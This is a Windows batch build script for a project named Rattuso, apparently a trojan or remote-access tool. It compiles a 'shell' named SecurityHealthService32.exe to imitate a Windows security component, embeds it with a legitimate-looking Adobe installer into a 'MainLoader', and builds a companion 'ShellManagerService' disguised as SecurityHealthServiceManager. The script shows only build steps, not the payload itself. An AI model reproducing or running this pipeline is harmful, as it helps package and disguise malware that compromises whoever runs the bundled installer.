@echo off
:: Global variables (set accordingly to your system)
set MSBuildPath="C:\Program Files\Microsoft Visual Studio\2022\Community\Msbuild\Current\Bin\MSBuild.exe"
set Platform="x86"
set ShellBuildPath="%cd%\output\x64\Release\SecurityHealthService32.exe"
set DllBuildPath="%cd%\output\%Platform%\Release\MyDll.exe"

:: Vars that will determine how the main loader is compiled
set /A NoDll = 1
set LegitProgramPath="C:\Users\bombo\Downloads\Adobe Master Collection CC 2022 v17.02.2022 (x64) Multilingua\AutoPlay\Docs\Adobe After Effects 2022 SP\Set-up.exe"

:: This command builds the shell in release mode
%MSBuildPath% Rattuso.sln /property:Configuration=Release /t:SecurityHealthService32 /p:Platform="x64"

:: These commands will generate the embeds.h and embeds.cs files for the appropriate builds
if %NoDll%==1 (
	echo Dll won't be used to build the main loader
	%cd%\objectify\objectify.py %ShellBuildPath% %LegitProgramPath%
) else (
	echo Dll will be used to build the main loader
	%cd%\objectify\objectify.py %ShellBuildPath%
)
%cd%\objectify\objectify_net.py -p -n ShellManagerService -c ShellManager ShellBuildPath

:: Move the embed files in the appropriate directories
echo Building service...
MOVE %cd%\objectify\embeds.cs %cd%\ShellManagerService\embeds.cs
%MSBuildPath% Rattuso.sln /property:Configuration=Release /t:SecurityHealthServiceManager /p:Platform="x86"
if %NoDll%==1 (
	echo Building main loader without DLL
	MOVE %cd%\objectify\embeds.h %cd%\MainLoader\embeds.h
	%MSBuildPath% Rattuso.sln /property:Configuration=Release /t:MainLoader /p:Platform=%Platform%
) else (
	echo Building main DLL
	MOVE %cd%\objectify\embeds.h %cd%\MainDll\embeds.h
	%MSBuildPath% Rattuso.sln /property:Configuration=Release /t:MyDll /p:Platform=%Platform%
	echo Building main Loader with DLL
	%cd%\objectify\objectify.py %DllBuildPath% %LegitProgramPath%
	MOVE %cd%\objectify\embeds.h %cd%\MainLoader\embeds.h
	%MSBuildPath% Rattuso.sln /property:Configuration=Release /t:MainLoader /p:Platform=%Platform%
)

PAUSE